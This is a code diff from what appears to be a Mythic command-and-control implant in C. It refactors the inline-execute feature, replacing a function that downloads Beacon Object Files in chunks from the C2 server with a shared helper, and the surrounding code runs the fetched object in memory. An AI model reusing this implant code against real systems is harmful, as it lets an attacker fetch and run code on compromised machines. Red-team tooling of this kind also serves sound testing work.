@@ -4,6 +4,7 @@
 #include "Parser.h"
 #include "Task.h"
 #include "Config.h"
+#include "Mythic.h"
 #include "BeaconCompatibility.h"
 
 #ifdef INCLUDE_CMD_INLINE_EXECUTE
@@ -246,140 +247,6 @@ BOOL RunCOFF(char* FileData, DWORD* DataSize, char* EntryName, char* argumentdat
 
 
 /**
- * @brief Fetches a BOF file from Mythic server
- * 
- * @param taskUuid Mythic uuid assigned to this task
- * @param bofFile Structure holds information about the downloaded BOF
- * @return DWORD status - 0 (success), or error code
- */
-DWORD LoadBofViaUuid(_In_ PCHAR taskUuid, _Inout_ BOF_UPLOAD* bofFile)
-{
-#define CHUNK_SIZE  512000      // 512 KB
-
-    _dbg("Retrieving BOF file from Mythic server ...");
-
-    DWORD Status            = 0;
-    PBYTE dataBuffer        = NULL;
-    DWORD bytesAvailable 	= 0;
-	DWORD totalBytesRead 	= 0;
-	DWORD bytesRead 		= 0;
-
-    dataBuffer = LocalAlloc(LPTR, CHUNK_SIZE);      // Freed in calling function
-    if (!dataBuffer) {
-        DWORD error = GetLastError();
-        _err("Failed to allocate memory. ERROR : %d", error);
-        Status = error;
-        goto END;
-    }
-
-    bofFile->currentChunk = 1;
-
-    do
-    {
-    /*
-     * Prepare the package to request current chunk
-     * - chunk_num
-     * - file_id
-     * - full_path
-     * - chunk_size
-    */
-        char* NotAPath = "a";  // We aren't writing BOF to disk, but need this field
-        PPackage data = PackageInit(UPLOAD_CHUNKED, TRUE);
-        PackageAddString(data, taskUuid, FALSE);
-        PackageAddInt32(data, bofFile->currentChunk);
-        PackageAddBytes(data, bofFile->fileUuid, TASK_UUID_SIZE, FALSE);
-        PackageAddString(data, NotAPath, TRUE);
-        PackageAddInt32(data, CHUNK_SIZE);
-        
-        // Send the package and receive the response
-        PARSER Response = { 0 };
-        PackageSend(data, &Response);
-        
-
-        BYTE success = ParserGetByte(&Response);
-        if (success == FALSE)
-        {
-            _err("UploadChunked returned failure status for chunk %d.", bofFile->currentChunk);
-            Status = ERROR_MYTHIC_UPLOAD;
-            goto END;
-        }
-        
-    /*
-     * Response will ALWAYS hold data in the following order:
-     * - File_id
-     * - total_chunks
-     * - chunk_num
-     * - chunk_data
-    */
-        // Get file_id from response
-        SIZE_T uuidLen  = TASK_UUID_SIZE;
-        PCHAR fileUuid = ParserGetString(&Response, &uuidLen);
-        if (fileUuid == NULL) 
-        {
-            _err("Failed to get UUID from response.");
-            Status = ERROR_MYTHIC_UPLOAD;
-            goto END;
-        }
-        
-        // Copy file_id
-        strncpy(bofFile->fileUuid, fileUuid, TASK_UUID_SIZE + 1);
-        bofFile->fileUuid[TASK_UUID_SIZE + 1] = '\0';
-        
-        // Get total_chunks from response
-        bofFile->totalChunks = ParserGetInt32(&Response);
-
-        // Current chunk number retrieved
-        bofFile->currentChunk = ParserGetInt32(&Response);
-
-        // Get chunk data from the response
-        SIZE_T bytesRead = 0;
-        PBYTE chunk = ParserGetBytes(&Response, &bytesRead);
-        if (!chunk)
-        {
-            _err("Failed to get chunk data for chunk %d.", bofFile->currentChunk);
-            Status = ERROR_MYTHIC_UPLOAD;
-            goto END;
-        }
-
-        _dbg("Received %d bytes for chunk %d.", bytesRead, bofFile->currentChunk);
-
-        // Write chunk to buffer
-        if (bytesRead == 0) break; 	// No more data
-        
-        // Check if more memory is needed
-        if (totalBytesRead + bytesRead > bytesAvailable) {
-            bytesAvailable = totalBytesRead + bytesRead;
-            dataBuffer = LocalReAlloc(dataBuffer, bytesAvailable, LMEM_MOVEABLE | LMEM_ZEROINIT);
-            if (!dataBuffer) {
-                DWORD error = GetLastError();
-                _err("Memory reallocation failed. ERROR : %d", error);
-                Status = error;
-                goto END;
-            }
-        }
-
-        // Add chunk to data buffer
-        memcpy(dataBuffer + totalBytesRead, chunk, bytesRead);
-        totalBytesRead += bytesRead;
-
-        // Clean up and prepare for the next chunk
-        bofFile->currentChunk++;
-        PackageDestroy(data);
-        ParserDestroy(&Response);
-
-    } while (bofFile->currentChunk <= bofFile->totalChunks);
-
-    _dbg("Chunked upload complete. Bof Size: %d bytes, Total chunks: %d", totalBytesRead, bofFile->currentChunk - 1);
-
-    bofFile->buffer = dataBuffer;
-    bofFile->size   = totalBytesRead;
-
-END:
-
-    return Status;
-}
-
-/**
  * @brief Fetch and execute BOF in current process thread.
  * 
  * @param[in] taskUuid Task's UUID
@@ -406,7 +273,7 @@ VOID InlineExecute(PCHAR taskUuid, PPARSER arguments)
 
 
     /* Fetch BOF file from Mythic */
-    if (status = LoadBofViaUuid(taskUuid, &bof) != 0)
+    if (status = MythicGetFileBytes(taskUuid, &bof) != 0)
     {
         _err("Failed to fetch BOF file from Mythic server.");
         PackageError(taskUuid, status);
@@ -441,7 +308,7 @@ VOID InlineExecute(PCHAR taskUuid, PPARSER arguments)
 
 // Cleanup
     free(outdata);                  // allocated in BeaconOutput()
-    LocalFree(bof.buffer);          // allocated in LoadBofViaUuid()
+    LocalFree(bof.buffer);          // allocated in MythicGetFileBytes()
     bof.buffer = NULL;
     PackageDestroy(data);
 }
